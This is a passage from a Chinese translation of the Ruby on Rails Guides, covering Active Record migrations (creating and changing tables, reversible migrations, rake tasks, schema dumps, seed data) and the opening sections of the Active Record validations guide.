    scale：设置 decimal 类型字段小数点后的数字位数；
    polymorphic：为 belongs_to 关联添加 type 字段；
    null：是否允许该字段的值为 NULL；

例如，执行下面的命令：
$ rails generate migration AddDetailsToProducts 'price:decimal{5,2}' supplier:references{polymorphic}

生成的迁移如下：
class AddDetailsToProducts < ActiveRecord::Migration
  def change
    add_column :products, :price, :decimal, precision: 5, scale: 2
    add_reference :products, :supplier, polymorphic: true, index: true
  end
end


##  3 编写迁移

使用前面介绍的生成器生成迁移后，就可以开始写代码了。

###  3.1 创建数据表

create_table 方法最常用，大多数时候都会由模型或脚手架生成器生成。典型的用例如下：
create_table :products do |t|
  t.string :name
end

这个迁移会创建 products 数据表，在数据表中创建 name 字段（后面会介绍，还会自动创建 id 字段）。

默认情况下，create_table 方法会创建名为 id 的主键。通过 :primary_key 选项可以修改主键名（修改后别忘了修改相应的模型）。如果不想生成主键，可以传入 id: false 选项。如果设置数据库的选项，可以在 :options 选择中使用 SQL。例如：
create_table :products, options: "ENGINE=BLACKHOLE" do |t|
  t.string :name, null: false
end

这样设置之后，会在创建数据表的 SQL 语句后面加上 ENGINE=BLACKHOLE。（MySQL 默认的选项是 ENGINE=InnoDB）

###  3.2 创建联合数据表

create_join_table 方法用来创建 HABTM 联合数据表。典型的用例如下：
create_join_table :products, :categories

这段代码会创建一个名为 categories_products 的数据表，包含两个字段：category_id 和 product_id。这两个字段的 :null 选项默认情况都是 false，不过可在 :column_options 选项中设置。
create_join_table :products, :categories, column_options: {null: true}

这段代码会把 product_id 和 category_id 字段的 :null 选项设为 true。

如果想修改数据表的名字，可以传入 :table_name 选项。例如：
create_join_table :products, :categories, table_name: :categorization

创建的数据表名为 categorization。

create_join_table 还可接受代码库，用来创建索引（默认无索引）或其他字段。
create_join_table :products, :categories do |t|
  t.index :product_id
  t.index :category_id
end

###  3.3 修改数据表

有一个和 create_table 类似地方法，名为 change_table，用来修改现有的数据表。其用法和 create_table 类似，不过传入块的参数知道更多技巧。例如：
change_table :products do |t|
  t.remove :description, :name
  t.string :part_number
  t.index :part_number
  t.rename :upccode, :upc_code
end

这段代码删除了 description 和 name 字段，创建 part_number 字符串字段，并建立索引，最后重命名 upccode 字段。

###  3.4 如果帮助方法不够用

如果 Active Record 提供的帮助方法不够用，可以使用 excute 方法，执行任意的 SQL 语句：
Product.connection.execute('UPDATE `products` SET `price`=`free` WHERE 1')

各方法的详细用法请查阅 API 文档：

    ActiveRecord::ConnectionAdapters::SchemaStatements：包含可在 change，up 和 down 中使用的方法；
    ActiveRecord::ConnectionAdapters::TableDefinition：包含可在 create_table 方法的块参数上调用的方法；
    ActiveRecord::ConnectionAdapters::Table：包含可在 change_table 方法的块参数上调用的方法；

###  3.5 使用 change 方法

change 是迁移中最常用的方法，大多数情况下都能完成指定的操作，而且 Active Record 知道如何撤这些操作。目前，在 change 方法中只能使用下面的方法：

    add_column
    add_index
    add_reference
    add_timestamps
    create_table
    create_join_table
    drop_table（必须提供代码块）
    drop_join_table（必须提供代码块）
    remove_timestamps
    rename_column
    rename_index
    remove_reference
    rename_table

只要在块中不使用 change、change_default 或 remove 方法，change_table 中的操作也是可逆的。

如果要使用任何其他方法，可以使用 reversible 方法，或者不定义 change 方法，而分别定义 up 和 down 方法。

###  3.6 使用 reversible 方法

Active Record 可能不知如何撤销复杂的迁移操作，这时可以使用 reversible 方法指定运行迁移和撤销迁移时怎么操作。例如：
class ExampleMigration < ActiveRecord::Migration
  def change
    create_table :products do |t|
      t.references :category
    end
 
    reversible do |dir|
      dir.up do
        #add a foreign key
        execute <<-SQL
          ALTER TABLE products
            ADD CONSTRAINT fk_products_categories
            FOREIGN KEY (category_id)
            REFERENCES categories(id)
        SQL
      end
      dir.down do
        execute <<-SQL
          ALTER TABLE products
            DROP FOREIGN KEY fk_products_categories
        SQL
      end
    end
 
    add_column :users, :home_page_url, :string
    rename_column :users, :email, :email_address
  end

使用 reversible 方法还能确保操作按顺序执行。在上面的例子中，如果撤销迁移，down 代码块会在 home_page_url 字段删除后、products 数据表删除前运行。

有时，迁移的操作根本无法撤销，例如删除数据。这是，可以在 down 代码块中抛出 ActiveRecord::IrreversibleMigration 异常。如果有人尝试撤销迁移，会看到一个错误消息，告诉他无法撤销。

###  3.7 使用 up 和 down 方法

在迁移中可以不用 change 方法，而用 up 和 down 方法。up 方法定义要对数据库模式做哪些操作，down 方法用来撤销这些操作。也就是说，如果执行 up 后立即执行 down，数据库的模式应该没有任何变化。例如，在 up 中创建了数据表，在 down 方法中就要将其删除。撤销时最好按照添加的相反顺序进行。前一节中的 reversible 用法示例代码可以改成：
class ExampleMigration < ActiveRecord::Migration
  def up
    create_table :products do |t|
      t.references :category
    end
 
    # add a foreign key
    execute <<-SQL
      ALTER TABLE products
        ADD CONSTRAINT fk_products_categories
        FOREIGN KEY (category_id)
        REFERENCES categories(id)
    SQL
 
    add_column :users, :home_page_url, :string
    rename_column :users, :email, :email_address
  end
 
  def down
    rename_column :users, :email_address, :email
    remove_column :users, :home_page_url
 
    execute <<-SQL
      ALTER TABLE products
        DROP FOREIGN KEY fk_products_categories
    SQL
 
    drop_table :products
  end
end

如果迁移不可撤销，应该在 down 方法中抛出 ActiveRecord::IrreversibleMigration 异常。如果有人尝试撤销迁移，会看到一个错误消息，告诉他无法撤销。

###  3.8 撤销之前的迁移

Active Record 提供了撤销迁移的功能，通过 revert 方法实现：
require_relative '2012121212_example_migration'
 
class FixupExampleMigration < ActiveRecord::Migration
  def change
    revert ExampleMigration
 
    create_table(:apples) do |t|
      t.string :variety
    end
  end
end

revert 方法还可接受一个块，定义撤销操作。revert 方法可用来撤销以前迁移的部分操作。例如，ExampleMigration 已经执行，但后来觉得最好还是序列化产品列表。那么，可以编写下面的代码：
class SerializeProductListMigration < ActiveRecord::Migration
  def change
    add_column :categories, :product_list
 
    reversible do |dir|
      dir.up do
        # transfer data from Products to Category#product_list
      end
      dir.down do
        # create Products from Category#product_list
      end
    end
 
    revert do
      # copy-pasted code from ExampleMigration
      create_table :products do |t|
        t.references :category
      end
 
      reversible do |dir|
        dir.up do
          #add a foreign key
          execute <<-SQL
            ALTER TABLE products
              ADD CONSTRAINT fk_products_categories
              FOREIGN KEY (category_id)
              REFERENCES categories(id)
          SQL
        end
        dir.down do
          execute <<-SQL
            ALTER TABLE products
              DROP FOREIGN KEY fk_products_categories
          SQL
        end
      end
 
      # The rest of the migration was ok
    end
  end
end

上面这个迁移也可以不用 revert 方法，不过步骤就多了：调换 create_table 和 reversible 的顺序，把 create_table 换成 drop_table，还要对调 up 和 down 中的代码。这些操作都可交给 revert 方法完成。


##  4 运行迁移

Rails 提供了很多 Rake 任务，用来执行指定的迁移。

其中最常使用的是 rake db:migrate，执行还没执行的迁移中的 change 或 up 方法。如果没有未运行的迁移，直接退出。rake db:migrate 按照迁移文件名中时间戳顺序执行迁移。

注意，执行 db:migrate 时还会执行 db:schema:dump，更新 db/schema.rb 文件，匹配数据库的结构。

如果指定了版本，Active Record 会运行该版本之前的所有迁移。版本就是迁移文件名前的数字部分。例如，要运行 20080906120000 这个迁移，可以执行下面的命令：
$ rake db:migrate VERSION=20080906120000

如果 20080906120000 比当前的版本高，上面的命令就会执行所有 20080906120000 之前（包括 20080906120000）的迁移中的 change 或 up 方法，但不会运行 20080906120000 之后的迁移。如果回滚迁移，则会执行 20080906120000 之前（不包括 20080906120000）的迁移中的 down 方法。

###  4.1 回滚

还有一个常用的操作时回滚到之前的迁移。例如，迁移代码写错了，想纠正。我们无须查找迁移的版本号，直接执行下面的命令即可：
$ rake db:rollback

这个命令会回滚上一次迁移，撤销 change 方法中的操作，或者执行 down 方法。如果想撤销多个迁移，可以使用 STEP 参数：
$ rake db:rollback STEP=3

这个命令会撤销前三次迁移。

db:migrate:redo 命令可以回滚上一次迁移，然后再次执行迁移。和 db:rollback 一样，如果想重做多次迁移，可以使用 STEP 参数。例如：
$ rake db:migrate:redo STEP=3

这些 Rake 任务的作用和 db:migrate 一样，只是用起来更方便，因为无需查找特定的迁移版本号。

###  4.2 搭建数据库

rake db:setup 任务会创建数据库，加载模式，并填充种子数据。

###  4.3 重建数据库

rake db:reset 任务会删除数据库，然后重建，等价于 rake db:drop db:setup。

这个任务和执行所有迁移的作用不同。rake db:reset 使用的是 schema.rb 文件中的内容。如果迁移无法回滚，rake db:reset 起不了作用。详细介绍参见“导出模式”一节。

###  4.4 运行指定的迁移

如果想执行指定迁移，或者撤销指定迁移，可以使用 db:migrate:up 和 db:migrate:down 任务，指定相应的版本号，就会根据需求调用 change、up 或 down 方法。例如：
$ rake db:migrate:up VERSION=20080906120000

这个命令会执行 20080906120000 迁移中的 change 方法或 up 方法。db:migrate:up 首先会检测指定的迁移是否已经运行，如果 Active Record 任务已经执行，就不会做任何操作。
###  4.5 在不同的环境中运行迁移

默认情况下，rake db:migrate 任务在 development 环境中执行。要在其他环境中运行迁移，执行命令时可以使用环境变量 RAILS_ENV 指定环境。例如，要在 test 环境中运行迁移，可以执行下面的命令：
$ rake db:migrate RAILS_ENV=test
###  4.6 修改运行迁移时的输出

默认情况下，运行迁移时，会输出操作了哪些操作，以及花了多长时间。创建数据表并添加索引的迁移产生的输出如下：
==  CreateProducts: migrating =================================================
-- create_table(:products)
   -> 0.0028s
==  CreateProducts: migrated (0.0028s) ========================================

在迁移中可以使用很多方法，控制输出：
方法 	作用
suppress_messages 	接受一个代码块，禁止代码块中所有操作的输出
say 	接受一个消息字符串作为参数，将其输出。第二个参数是布尔值，指定输出结果是否缩进
say_with_time 	输出文本，以及执行代码块中操作所用时间。如果代码块的返回结果是整数，会当做操作的记录数量

例如，下面这个迁移：
class CreateProducts < ActiveRecord::Migration
  def change
    suppress_messages do
      create_table :products do |t|
        t.string :name
        t.text :description
        t.timestamps
      end
    end
 
    say "Created a table"
 
    suppress_messages {add_index :products, :name}
    say "and an index!", true
 
    say_with_time 'Waiting for a while' do
      sleep 10
      250
    end
  end
end

输出结果是：
==  CreateProducts: migrating =================================================
-- Created a table
   -> and an index!
-- Waiting for a while
   -> 10.0013s
   -> 250 rows
==  CreateProducts: migrated (10.0054s) =======================================

如果不想让 Active Record 输出任何结果，可以使用 rake db:migrate VERBOSE=false。


##  5 修改现有的迁移

有时编写的迁移中可能有错误，如果已经运行了迁移，不能直接编辑迁移文件再运行迁移。Rails 认为这个迁移已经运行，所以执行 rake db:migrate 任务时什么也不会做。这种情况必须先回滚迁移（例如，执行 rake db:rollback 任务），编辑迁移文件后再执行 rake db:migrate 任务执行改正后的版本。

一般来说，直接修改现有的迁移不是个好主意。这么做会为你以及你的同事带来额外的工作量，如果这个迁移已经在生产服务器上运行过，还可能带来不必要的麻烦。你应该编写一个新的迁移，做所需的改动。编辑新生成还未纳入版本控制的迁移（或者更宽泛地说，还没有出现在开发设备之外），相对来说是安全的。

在新迁移中撤销之前迁移中的全部操作或者部分操作可以使用 revert 方法。（参见前面的 撤销之前的迁移 一节）

##  6 导出模式
###  6.1 模式文件的作用

迁移的作用并不是为数据库模式提供可信的参考源。db/schema.rb 或由 Active Record 生成的 SQL 文件才有这个作用。db/schema.rb 这些文件不可修改，其目的是表示数据库的当前结构。

部署新程序时，无需运行全部的迁移。直接加载数据库结构要简单快速得多。

例如，测试数据库是这样创建的：导出开发数据库的结构（存入文件 db/schema.rb 或 db/structure.sql），然后导入测试数据库。

模式文件还可以用来快速查看 Active Record 中有哪些属性。模型中没有属性信息，而且迁移会频繁修改属性，但是模式文件中有最终的结果。annotate_models gem 会在模型文件的顶部加入注释，自动添加并更新模型的模式。

###  6.2 导出的模式文件类型

导出模式有两种方法，由 config/application.rb 文件中的 config.active_record.schema_format 选项设置，可以是 :sql 或 :ruby。

如果设为 :ruby，导出的模式保存在 db/schema.rb 文件中。打开这个文件，你会发现内容很多，就像一个很大的迁移：
ActiveRecord::Schema.define(version: 20080906171750) do
  create_table "authors", force: true do |t|
    t.string   "name"
    t.datetime "created_at"
    t.datetime "updated_at"
  end
 
  create_table "products", force: true do |t|
    t.string   "name"
    t.text "description"
    t.datetime "created_at"
    t.datetime "updated_at"
    t.string "part_number"
  end
end

大多数情况下，文件的内容都是这样。这个文件使用 create_table、add_index 等方法审查数据库的结构。这个文件盒使用的数据库类型无关，可以导入任何一种 Active Record 支持的数据库。如果开发的程序需要兼容多种数据库，可以使用这个文件。

不过 db/schema.rb 也有缺点：无法执行数据库的某些操作，例如外键约束，触发器，存储过程。在迁移文件中可以执行 SQL 语句，但导出模式的程序无法从数据库中重建这些语句。如果你的程序用到了前面提到的数据库操作，可以把模式文件的格式设为 :sql。

:sql 格式的文件不使用 Active Record 的模式导出程序，而使用数据库自带的导出工具（执行 db:structure:dump 任务），把数据库模式导入 db/structure.sql 文件。例如，PostgreSQL 使用 pg_dump 导出模式。如果使用 MySQL，db/structure.sql 文件中会出现多个 SHOW CREATE TABLE 用来创建数据表的语句。

加载模式时，只要执行其中的 SQL 语句即可。按预期，导入后会创建一个完整的数据库结构。使用 :sql 格式，就不能把模式导入其他类型的数据库中了。

###  6.3 模式导出和版本控制

因为导出的模式文件时数据库模式的可信源，强烈推荐将其纳入版本控制。


##  7 Active Record 和引用完整性

Active Record 在模型中，而不是数据库中设置关联。因此，需要在数据库中实现的功能，例如触发器、外键约束，不太常用。

validates :foreign_key, uniqueness: true 这个验证是模型保证数据完整性的一种方法。在关联中设置 :dependent 选项，可以保证父对象删除后，子对象也会被删除。和任何一种程序层的操作一样，这些无法完全保证引用完整性，所以很多人还是会在数据库中使用外键约束。

Active Record 并没有为使用这些功能提供任何工具，不过 execute 方法可以执行任意的 SQL 语句。还可以使用 foreigner 等 gem，为 Active Record 添加外键支持（还能把外键导出到 db/schema.rb 文件）。

##  8 迁移和种子数据

有些人使用迁移把数据存入数据库：
class AddInitialProducts < ActiveRecord::Migration
  def up
    5.times do |i|
      Product.create(name: "Product ##{i}", description: "A product.")
    end
  end
 
  def down
    Product.delete_all
  end
end

Rails 提供了“种子”功能，可以把初始化数据存入数据库。这个功能用起来很简单，在 db/seeds.rb 文件中写一些 Ruby 代码，然后执行 rake db:seed 命令即可：
5.times do |i|
  Product.create(name: "Product ##{i}", description: "A product.")
end

填充新建程序的数据库，使用这种方法操作起来简洁得多。

##  反馈

欢迎帮忙改善指南质量。

如发现任何错误，欢迎修正。开始贡献前，可先行阅读贡献指南：文档。

翻译如有错误，深感抱歉，欢迎 Fork 修正，或至此处回报。

文章可能有未完成或过时的内容。请先检查 Edge Guides 来确定问题在 master 是否已经修掉了。再上 master 补上缺少的文件。内容参考 Ruby on Rails 指南准则来了解行文风格。

最后，任何关于 Ruby on Rails 文档的讨论，欢迎到 rubyonrails-docs 邮件群组。

本著作采用创用 CC 姓名标示-相同方式分享 4.0 国际授权条款授权。

“Rails”、“Ruby on Rails”，以及 Rails logo 为 David Heinemeier Hansson 的商标。版权所有。

——————————————————————————————————
#  Active Record 数据验证

本文介绍如何使用 Active Record 提供的数据验证功能在数据存入数据库之前验证对象的状态。

读完本文，你将学到：

    如何使用 Active Record 内建的数据验证帮助方法；
    如果编写自定义的数据验证方法；
    如何处理验证时产生的错误消息；

Chapters

    数据验证简介
        为什么要做数据验证？
        什么时候做数据验证？
        跳过验证
        valid? 和 invalid?
        errors[]
    数据验证帮助方法
        acceptance
        validates_associated
        confirmation
        exclusion
        format
        inclusion
        length
        numericality
        presence
        absence
        uniqueness
        validates_with
        validates_each
    常用的验证选项
        :allow_nil
        :allow_blank
        :message
        :on
    严格验证
    条件验证
        指定 Symbol
        指定字符串
        指定 Proc
        条件组合
        联合条件
    自定义验证方式
        自定义验证使用的类
        自定义验证使用的方法
    处理验证错误
        errors
        errors[]
        errors.add
        errors[:base]
        errors.clear
        errors.size
    在视图中显示验证错误

##  1 数据验证简介

###  演示
下面演示一个非常简单的数据验证：
class Person < ActiveRecord::Base
  validates :name, presence: true
end
 
Person.create(name: "John Doe").valid? # => true
Person.create(name: nil).valid? # => false

如上所示，如果 Person 没有 name 属性，验证就会将其视为不合法对象。创建的第二个 Person 对象不会存入数据库。

在深入探讨之前，我们先来介绍数据验证在整个程序中的作用。

###  1.1 为什么要做数据验证？

数据验证能确保只有合法的数据才会存入数据库。例如，程序可能需要用户提供一个合法的 Email 地址和邮寄地址。在模型中做验证是最有保障的，只有通过验证的数据才能存入数据库。数据验证和使用的数据库种类无关，终端用户也无法跳过，而且容易测试和维护。在 Rails 中做数据验证很简单，Rails 内置了很多帮助方法，能满足常规的需求，而且还可以编写自定义的验证方法。

数据存入数据库之前的验证方法还有其他几种，包括数据库内建的约束，客户端验证和控制器层验证。下面列出了这几种验证方法的优缺点：

    数据库约束和“存储过程”无法兼容多种数据库，而且测试和维护较为困难。不过，如果其他程序也要使用这个数据库，最好在数据库层做些约束。数据库层的某些验证（例如在使用量很高的数据表中做唯一性验证）通过其他方式实现起来有点困难。
    客户端验证很有用，但单独使用时可靠性不高。如果使用 JavaScript 实现，用户在浏览器中禁用 JavaScript 后很容易跳过验证。客户端验证和其他验证方式结合使用，可以为用户提供实时反馈。
    控制器层验证很诱人，但一般都不灵便，难以测试和维护。只要可能，就要保证控制器的代码简洁性，这样才有利于长远发展。

你可以根据实际的需求选择使用哪种验证方式。Rails 团队认为，模型层数据验证最具普适性。

###  1.2 什么时候做数据验证？

在 Active Record 中对象有两种状态：一种在数据库中有对应的记录，一种没有。新建的对象（例如，使用 new 方法）还不属于数据库。在对象上调用 save 方法后，才会把对象存入相应的数据表。Active Record 使用实例方法 new_record? 判断对象是否已经存入数据库。假如有下面这个简单的 Active Record 类：
class Person < ActiveRecord::Base
end

我们可以在 rails console 中看一下到底怎么回事：
$ rails console
>> p = Person.new(name: "John Doe")
=> #<Person id: nil, name: "John Doe", created_at: nil, updated_at: nil>
>> p.new_record?
=> true
>> p.save
=> true
>> p.new_record?
=> false

新建并保存记录会在数据库中执行 SQL INSERT 操作。更新现有的记录会在数据库上执行 SQL UPDATE 操作。一般情况下，数据验证发生在这些 SQL 操作执行之前。如果验证失败，对象会被标记为不合法，Active Record 不会向数据库发送 INSERT 或 UPDATE 指令。这样就可以避免把不合法的数据存入数据库。你可以选择在对象创建、保存或更新时执行哪些数据验证。

修改数据库中对象的状态有很多方法。有些方法会做数据验证，有些则不会。所以，如果不小心处理，还是有可能把不合法的数据存入数据库。

下列方法会做数据验证，如果验证失败就不会把对象存入数据库：

    create
    create!
    save
    save!
    update
    update!

爆炸方法（例如 save!）会在验证失败后抛出异常。验证失败后，非爆炸方法不会抛出异常，save 和 update 返回 false，create 返回对象本身。

###  1.3 跳过验证

下列方法会跳过验证，不管验证是否通过都会把对象存入数据库，使用时要特别留意。

    decrement!
    decrement_counter
    increment!
    increment_counter
    toggle!
    touch
    update_all
    update_attribute
    update_column
    update_columns
    update_counters

注意，使用 save 时如果传入 validate: false，也会跳过验证。使用时要特别留意。

    save(validate: false)

###  1.4 valid? 和 invalid?

Rails 使用 valid? 方法检查对象是否合法。valid? 方法会触发数据验证，如果对象上没有错误，就返回 true，否则返回 false。前面我们已经用过了：
class Person < ActiveRecord::Base
  validates :name, presence: true
end
 
Person.create(name: "John Doe").valid? # => true
Person.create(name: nil).valid? # => false

Active Record 验证结束后，所有发现的错误都可以通过实例方法 errors.messages 获取，该方法返回一个错误集合。如果数据验证后，这个集合为空，则说明对象是合法的。

注意，使用 new 方法初始化对象时，即使不合法也不会报错，因为这时还没做数据验证。
class Person < ActiveRecord::Base
  validates :name, presence: true
end
 
>> p = Person.new
# => #<Person id: nil, name: nil>
>> p.errors.messages
# => {}
 
>> p.valid?
# => false
>> p.errors.messages
# => {name:["can't be blank"]}
 
>> p = Person.create
# => #<Person id: nil, name: nil>
>> p.errors.messages
# => {name:["can't be blank"]}
 
>> p.save
# => false
 
>> p.save!
# => ActiveRecord::RecordInvalid: Validation failed: Name can't be blank
 
>> Person.create!
# => ActiveRecord::RecordInvalid: Validation failed: Name can't be blank

invalid? 是 valid? 的逆测试，会触发数据验证，如果找到错误就返回 true，否则返回 false。

###  1.5 errors[]

要检查对象的某个属性是否合法，可以使用 errors[:attribute]。errors[:attribute] 中包含 :attribute 的所有错误。如果某个属性没有错误，就会返回空数组。

这个方法只在数据验证之后才能使用，因为它只是用来收集错误信息的，并不会触发验证。而且，和前面介绍的 ActiveRecord::Base#invalid? 方法不一样，因为 errors[:attribute] 不会验证整个对象，只检查对象的某个属性是否出错。
class Person < ActiveRecord::Base
  validates :name, presence: true
end
 
>> Person.new.errors[:name].any? # => false
>> Person.create.errors[:name].any? # => true

我们会在“处理验证错误”一节详细介绍验证错误。现在，我们来看一下 Rails 默认提供的数据验证帮助方法。


##  2 数据验证帮助方法

Active Record 预先定义了很多数据验证帮助方法，可以直接在模型类定义中使用。这些帮助方法提供了常用的验证规则。每次验证失败后，都会向对象的 errors 集合中添加一个消息，这些消息和所验证的属性是关联的。

每个帮助方法都可以接受任意数量的属性名，所以一行代码就能在多个属性上做同一种验证。

所有的帮助方法都可指定 :on 和 :message 选项，指定何时做验证，以及验证失败后向 errors 集合添加什么消息。:on 选项的可选值是 :create 和 :update。每个帮助函数都有默认的错误消息，如果没有通过 :message 选项指定，则使用默认值。下面分别介绍各帮助方法。

###  2.1 acceptance

这个方法检查表单提交时，用户界面中的复选框是否被选中。这个功能一般用来要求用户接受程序的服务条款，阅读一些文字，等等。这种验证只针对网页程序，不会存入数据库（如果没有对应的字段，该方法会创建一个虚拟属性）。
class Person < ActiveRecord::Base
  validates :terms_of_service, acceptance: true
end

这个帮助方法的默认错误消息是“must be accepted”。

这个方法可以指定 :accept 选项，决定可接受什么值。默认为“1”，很容易修改：
class Person < ActiveRecord::Base
  validates :terms_of_service, acceptance: { accept: 'yes' }
end

###  2.2 validates_associated

如果模型和其他模型有关联，也要验证关联的模型对象，可以使用这个方法。保存对象是，会在相关联的每个对象上调用 valid? 方法。
class Library < ActiveRecord::Base
  has_many :books
  validates_associated :books
end

这个帮助方法可用于所有关联类型。

不要在关联的两端都使用 validates_associated，这样会生成一个循环。

validates_associated 的默认错误消息是“is invalid”。注意，相关联的每个对象都有各自的 errors 集合，错误消息不会都集中在调用该方法的模型对象上。

###  2.3 confirmation

如果要检查两个文本字段的值是否完全相同，可以使用这个帮助方法。例如，确认 Email 地址或密码。这个帮助方法会创建一个虚拟属性，其名字为要验证的属性名后加 _confirmation。
class Person < ActiveRecord::Base
  validates :email, confirmation: true
end

在视图中可以这么写：
<%= text_field :person, :email %>
<%= text_field :person, :email_confirmation %>

只有 email_confirmation 的值不是 nil 时才会做这个验证。所以要为确认属性加上存在性验证（后文会介绍 presence 验证）。
class Person < ActiveRecord::Base
  validates :email, confirmation: true
  validates :email_confirmation, presence: true
end

这个帮助方法的默认错误消息是“doesn't match confirmation”。

###  2.4 exclusion

这个帮助方法检查属性的值是否不在指定的集合中。集合可以是任何一种可枚举的对象。
class Account < ActiveRecord::Base
  validates :subdomain, exclusion: { in: %w(www us ca jp),
    message: "%{value} is reserved." }
end

exclusion 方法要指定 :in 选项，设置哪些值不能作为属性的值。:in 选项有个别名 :with，作用相同。上面的例子设置了 :message 选项，演示如何获取属性的值。

默认的错误消息是“is reserved”。

###  2.5 format

这个帮助方法检查属性的值是否匹配 :with 选项指定的正则表达式。
class Product < ActiveRecord::Base
  validates :legacy_code, format: { with: /\A[a-zA-Z]+\z/,
    message: "only allows letters" }
end

默认的错误消息是“is invalid”。

###  2.6 inclusion

这个帮助方法检查属性的值是否在指定的集合中。集合可以是任何一种可枚举的对象。
class Coffee < ActiveRecord::Base
  validates :size, inclusion: { in: %w(small medium large),
    message: "%{value} is not a valid size" }
end

inclusion 方法要指定 :in 选项，设置可接受哪些值。:in 选项有个别名 :within，作用相同。上面的例子设置了 :message 选项，演示如何获取属性的值。

该方法的默认错误消息是“is not included in the list”。

###  2.7 length

这个帮助方法验证属性值的长度，有多个选项，可以使用不同的方法指定长度限制：
class Person < ActiveRecord::Base
  validates :name, length: { minimum: 2 }
  validates :bio, length: { maximum: 500 }
  validates :password, length: { in: 6..20 }
  validates :registration_number, length: { is: 6 }
end

可用的长度限制选项有：

    :minimum：属性的值不能比指定的长度短；
    :maximum：属性的值不能比指定的长度长；
    :in（或 :within）：属性值的长度在指定值之间。该选项的值必须是一个范围；
    :is：属性值的长度必须等于指定值；

默认的错误消息根据长度验证类型而有所不同，还是可以 :message 定制。定制消息时，可以使用 :wrong_length、:too_long 和 :too_short 选项，%{count} 表示长度限制的值。
class Person < ActiveRecord::Base
  validates :bio, length: { maximum: 1000,
    too_long: "%{count} characters is the maximum allowed" }
end

这个帮助方法默认统计字符数，但可以使用 :tokenizer 选项设置其他的统计方式：
class Essay < ActiveRecord::Base
  validates :content, length: {
    minimum: 300,
    maximum: 400,
    tokenizer: lambda { |str| str.scan(/\w+/) },
    too_short: "must have at least %{count} words",
    too_long: "must have at most %{count} words"
  }
end

注意，默认的错误消息使用复数形式（例如，“is too short (minimum is %{count} characters”），所以如果长度限制是 minimum: 1，就要提供一个定制的消息，或者使用 presence: true 代替。:in 或 :within 的值比 1 小时，都要提供一个定制的消息，或者在 length 之前，调用 presence 方法。

###  2.8 numericality

这个帮助方法检查属性的值是否值包含数字。默认情况下，匹配的值是可选的正负符号后加整数或浮点数。如果只接受整数，可以把 :only_integer 选项设为 true。

如果 :only_integer 为 true，则使用下面的正则表达式验证属性的值。
/\A[+-]?\d+\Z/

否则，会尝试使用 Float 把值转换成数字。

注意上面的正则表达式允许最后出现换行符。
class Player < ActiveRecord::Base
  validates :points, numericality: true
  validates :games_played, numericality: { only_integer: true }
end

除了 :only_integer 之外，这个方法还可指定以下选项，限制可接受的值：

    :greater_than：属性值必须比指定的值大。该选项默认的错误消息是“must be greater than %{count}”；
    :greater_than_or_equal_to：属性值必须大于或等于指定的值。该选项默认的错误消息是“must be greater than or equal to %{count}”；
    :equal_to：属性值必须等于指定的值。该选项默认的错误消息是“must be equal to %{count}”；
    :less_than：属性值必须比指定的值小。该选项默认的错误消息是“must be less than %{count}”；
    :less_than_or_equal_to：属性值必须小于或等于指定的值。该选项默认的错误消息是“must be less than or equal to %{count}”；
    :odd：如果设为 true，属性值必须是奇数。该选项默认的错误消息是“must be odd”；
    :even：如果设为 true，属性值必须是偶数。该选项默认的错误消息是“must be even”；

默认的错误消息是“is not a number”。

###  2.9 presence

这个帮助方法检查指定的属性是否为非空值，调用 blank? 方法检查只是否为 nil 或空字符串，即空字符串或只包含空白的字符串。
class Person < ActiveRecord::Base
  validates :name, :login, :email, presence: true
end

如果要确保关联对象存在，需要测试关联的对象本身是够存在，而不是用来映射关联的外键。
class LineItem < ActiveRecord::Base
  belongs_to :order
  validates :order, presence: true
end

为了能验证关联的对象是否存在，要在关联中指定 :inverse_of 选项。
class Order < ActiveRecord::Base
  has_many :line_items, inverse_of: :order
end

如果验证 has_one 或 has_many 关联的对象是否存在，会在关联的对象上调用 blank? 和 marked_for_destruction? 方法。

因为 false.blank? 的返回值是 true，所以如果要验证布尔值字段是否存在要使用 validates :field_name, inclusion: { in: [true, false] }。

默认的错误消息是“can't be blank”。

###  2.10 absence

这个方法验证指定的属性值是否为空，使用 present? 方法检测值是否为 nil 或空字符串，即空字符串或只包含空白的字符串。
class Person < ActiveRecord::Base
  validates :name, :login, :email, absence: true
end

如果要确保关联对象为空，需要测试关联的对象本身是够为空，而不是用来映射关联的外键。
class LineItem < ActiveRecord::Base
  belongs_to :order
  validates :order, absence: true
end

为了能验证关联的对象是否为空，要在关联中指定 :inverse_of 选项。
class Order < ActiveRecord::Base
  has_many :line_items, inverse_of: :order
end

如果验证 has_one 或 has_many 关联的对象是否为空，会在关联的对象上调用 present? 和 marked_for_destruction? 方法。

因为 false.present? 的返回值是 false，所以如果要验证布尔值字段是否为空要使用 validates :field_name, exclusion: { in: [true, false] }。

默认的错误消息是“must be blank”。

###  2.11 uniqueness

这个帮助方法会在保存对象之前验证属性值是否是唯一的。该方法不会在数据库中创建唯一性约束，所以有可能两个数据库连接创建的记录字段的值是相同的。为了避免出现这种问题，要在数据库的字段上建立唯一性索引。关于多字段所以的详细介绍，参阅 MySQL 手册。
class Account < ActiveRecord::Base
  validates :email, uniqueness: true
end

这个验证会在模型对应的数据表中执行一个 SQL 查询，检查现有的记录中该字段是否已经出现过相同的值。

:scope 选项可以指定其他属性，用来约束唯一性验证：
class Holiday < ActiveRecord::Base
  validates :name, uniqueness: { scope: :year,
    message: "should happen once per year" }
end

还有个 :case_sensitive 选项，指定唯一性验证是否要区分大小写，默认值为 true。
class Person < ActiveRecord::Base
  validates :name, uniqueness: { case_sensitive: false }
end

注意，有些数据库的设置是，查询时不区分大小写。

默认的错误消息是“has already been taken”。

###  2.12 validates_with

这个帮助方法把记录交给其他的类做验证。
class GoodnessValidator < ActiveModel::Validator
  def validate(record)
    if record.first_name == "Evil"
      record.errors[:base] << "This person is evil"
    end
  end
end
 
class Person < ActiveRecord::Base
  validates_with GoodnessValidator
end

record.errors[:base] 中的错误针对整个对象，而不是特定的属性。

validates_with 方法的参数是一个类，或一组类，用来做验证。validates_with 方法没有默认的错误消息。在做验证的类中要手动把错误添加到记录的错误集合中。

实现 validate 方法时，必须指定 record 参数，这是要做验证的记录。

和其他验证一样，validates_with 也可指定 :if、:unless 和 :on 选项。如果指定了其他选项，会包含在 options 中传递给做验证的类。
class GoodnessValidator < ActiveModel::Validator
  def validate(record)
    if options[:fields].any?{|field| record.send(field) == "Evil" }
      record.errors[:base] << "This person is evil"
    end
  end
end
 
class Person < ActiveRecord::Base
  validates_with GoodnessValidator, fields: [:first_name, :last_name]
end

注意，做验证的类在整个程序的生命周期内只会初始化一次，而不是每次验证时都初始化，所以使用实例变量时要特别小心。

